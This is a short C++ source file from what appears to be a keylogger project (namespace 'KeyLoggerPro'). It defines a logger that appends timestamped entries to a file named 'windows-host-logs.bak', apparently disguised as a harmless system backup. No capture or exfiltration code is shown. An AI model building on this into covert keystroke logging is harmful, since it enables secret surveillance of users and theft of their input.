#include "stdafx.h"
#include "Logger.h"
#include "BasicDateTime.h"

namespace KeyLoggerPro {

  Logger::Logger() : log("windows-host-logs.bak", std::ios::app) { }

  void Logger::write(const std::string &_inf) {
    log << "[" << BasicDateTime().dateToString() << "] " << _inf << "\n";
  }

}
